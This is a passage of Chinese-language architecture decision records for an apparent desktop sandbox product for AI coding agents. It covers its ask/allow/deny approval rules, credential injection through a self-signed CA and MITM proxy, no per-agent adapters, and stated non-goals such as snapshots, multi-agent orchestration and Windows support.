- **理由**：Docker 的立场是"沙箱即安全，不需要提示"，那是给开发者的。我们的用户是普通桌面用户，`curl: (56) Recv failure` 对他们等于软件坏了。
- **代价**：多一套审批队列与作用域状态机。
- **红线**：弹窗只能把 `ask` 提升为 `allow`，**永远不能绕过 `deny`**。

### ADR-004 凭证只做 MITM，不接受 base_url 替代

- **决定**：宿主侧自签 CA + MITM，覆盖 Authorization。
- **被否**：`ANTHROPIC_BASE_URL` / Codex `model_providers.base_url` 指向本地网关。
- **理由**：base_url 只覆盖模型调用；GitHub MCP、`pip`、`curl` 仍然需要 MITM。选 base_url 等于最终还是要写 MITM，只是多写一套。
- **代价**：容器内必须装 CA，且要覆盖 Node / Python / Go / curl 四套信任环境。
- **踩坑记录**：goproxy 自带公开 CA 私钥，必须自签；goproxy 默认读取宿主 `HTTPS_PROXY`，必须清空。

### ADR-005 `dsh` 不做专项适配

- **决定**：产品支持"自定义 Agent 命令"，`claude` / `codex` / `dsh` 都只是配置项。
- **被否**：为每个 Agent 写适配器与参数模板。
- **理由**：dsh 的运行形态（Linux 可执行 / 仅 macOS）在文档写作时未知。把它变成阻塞项，等于用一个未知数换掉整个排期。
- **代价**：对三个 Agent 都不做深度集成（例如不解析它们的 session 格式）。可接受——我们卖的是边界，不是 Agent 集成。
- **风险**：若 dsh 仅 macOS 原生二进制，则它无法进 Linux 容器，届时在 UI 上明确标注"该 Agent 仅支持本机模式（无沙箱）"，而不是假装支持。

### ADR-006 明确不做快照 / 多 Agent / Windows

- **决定**：不在 60 小时内做，且写进文档。
- **理由**：快照需要 userfaultfd + COW（E2B 的量级）；多 Agent 编排只有 Daytona / Runloop / K8s 做了，各自是一个平台；WSL2 的 Landlock 版本差异会毁掉策略一致性。
- **写法**：在"非目标"里给出理由，比被评委问出来强。
